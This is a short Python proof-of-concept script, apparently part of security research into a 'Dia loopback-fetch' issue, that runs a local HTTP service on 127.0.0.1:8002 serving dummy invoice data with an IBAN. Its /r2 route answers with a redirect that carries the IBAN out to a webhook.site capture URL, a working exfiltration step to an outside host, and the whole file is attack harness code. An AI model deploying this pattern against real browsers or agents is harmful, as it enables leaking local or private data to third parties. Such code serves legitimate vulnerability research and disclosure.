#!/usr/bin/env python3
"""Loopback service for the Dia loopback-fetch PoC. 127.0.0.1:8002, no CORS headers."""
import http.server, os, socketserver, urllib.parse

HOOK = os.environ.get("HOOK", "https://webhook.site/e7f2e00d-391b-4e8e-ab1c-376d2c57cc6c")
PAYLOAD = "TOTAL_DUE=1204.00 USD\nIBAN=GB11BCNY00000001234567\n"

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *a):
        print("  " + (fmt % a), flush=True)

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path.strip("/")
        if p == "r2":            # the interesting one: bounce straight off-box
            self.send_response(302)
            self.send_header("Location", HOOK + "/redir/" + PAYLOAD.split("IBAN=")[1].strip())
            self.end_headers()
            return
        if p.startswith("api/"):  # static payload for the no-redirect variant
            b = PAYLOAD.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
            return
        self.send_response(404)
        self.end_headers()

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", 8002), H) as s:
    print("listening on http://127.0.0.1:8002  (capture -> %s)" % HOOK, flush=True)
    s.serve_forever()
